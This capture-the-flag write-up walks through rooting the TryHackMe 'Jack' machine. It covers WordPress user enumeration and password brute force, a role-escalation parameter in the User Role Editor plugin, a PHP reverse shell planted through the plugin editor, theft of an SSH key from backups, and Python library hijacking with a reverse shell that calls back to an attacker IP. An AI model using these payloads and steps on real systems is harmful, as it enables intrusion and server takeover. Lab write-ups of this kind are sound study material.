# [Jack](https://tryhackme.com/room/jack)

## Compromise a web server running Wordpress, obtain a low privileged user and escalate your privileges to root using a Python module.

# Deploy & Root

## Connect to our network and deploy this machine. Add jack.thm to /etc/hosts

### Gain initial access and obtain the user flag.

_Wpscan user enumeration, and don't use tools (ure_other_roles)_

1. Add the target domain to `/etc/hosts` file

![SCREEN01](https://github.com/user-attachments/assets/29ff46e9-08d5-4fa6-911e-e50d36a36885)

2. Enumerate WordPress users with `WPScan`
   - Found users are **jack**, **danny**, **wendy**

```bash
wpscan --url http://jack.thm --enumerate u
```

![SCREEN02](https://github.com/user-attachments/assets/b78ea81b-b7bb-405e-8f75-669679a1488f)

3. Crack the password
   - Wendy password is: **changelater**

```bash
wpscan --url http://jack.thm --passwords /root/Tools/wordlists/rockyou.txt --usernames jack,danny,wendy
```

![SCREEN03](https://github.com/user-attachments/assets/71bc527d-c9ed-47d6-ac3a-83668e95c879)

4. Wendy has limited privileges. Enumerate WordPress plugins to find potential vulnerabilities
   - The site uses **User Role Editor (version 4.24)**, which allows modification of user roles and capabilities

```bash
wpscan --url http://jack.thm --enumerate p --plugins-detection aggressive
```

![SCREEN04](https://github.com/user-attachments/assets/7059c1ae-83bc-40ec-8739-333bf4ecc73e)

5. Capture POST request to update profile at `http://jack.thm/wp-admin/profile.php` and add `&ure_other_roles=administrator` at the end

![SCREEN05](https://github.com/user-attachments/assets/758016d2-cd7a-4234-af9c-e1ea096416c2)

6. Now with administrative access go to the `http://jack.thm/wp-admin/plugin-editor.php` and add the [reverse shell payload](https://github.com/mosec0/Reverse-Shell/blob/main/reverse-shell.php) at the beggining of the script

```php
<?php
// Set Your IP and Port
$ip = '127.0.0.1';
$port = 4444;

// Open Connection on Your Machine
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

![SCREEN06](https://github.com/user-attachments/assets/8b18d458-fc6b-4257-bba7-e55fdf5e48f3)

7.On your attack machine, set up a listener to catch the reverse shell

```bash
nc -lvnp 4444
```

7. Activate the modified Akismet plugin by navigating to `http://jack.thm/wp-admin/plugins.php` and clicking "Activate" under Akismet

8. Get the user flag

```bash
cat /home/jack/user.txt
```
![SCREEN07](https://github.com/user-attachments/assets/964ce005-9fc1-466c-b821-f95ecd374e2c)

---

### Escalate your privileges to root. Whats the root flag?

_Python_

1. Upgrade to a more stable shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

2. Read the `reminder.txt`

```bash
cat /home/jack/reminder.txt
```

![SCREEN08](https://github.com/user-attachments/assets/c6814e59-4550-4f5c-b651-82f7a62a5fab)

3. Check the backups directory `/var/backups` and get the `id_rsa`. Save it on our attack machine and use it to login as jack

```bash
ls -la /var/backups
cat /var/backups/id_rsa
```

```bash
chmod 600 id_rsa
ssh -i id_rsa jack@10.10.144.140
```

4. Search for custom Python scripts that might be running with elevated privileges
   - There is `/opt/statuscheck/checker.py` which imports `os.py`

```bash
find / -name "*.py" -not -path "/usr/lib/*" -not -path "/etc/python*" 2>/dev/null

cat /opt/statuscheck/checker.py

locate os.py
```

![SCREEN09](https://github.com/user-attachments/assets/1317873d-a503-4146-b480-90dae43bdffc)

5. Start new listener on attack machine and add payload at the end of `os.py` file

```bash
nc -lvnp 5555
```

```bash
nano /usr/lib/python2.7/os.py
```

```python
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.63.179",5555))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

![SCREEN10](https://github.com/user-attachments/assets/89ab75c1-0cf0-4666-9301-f8c3c8294f15)

6. Wait for shell and get the `root.txt` flag

```bash
cat /root/root.txt
```

![SCREEN11](https://github.com/user-attachments/assets/52ea374d-1a42-4692-96ad-a2912ce90878)
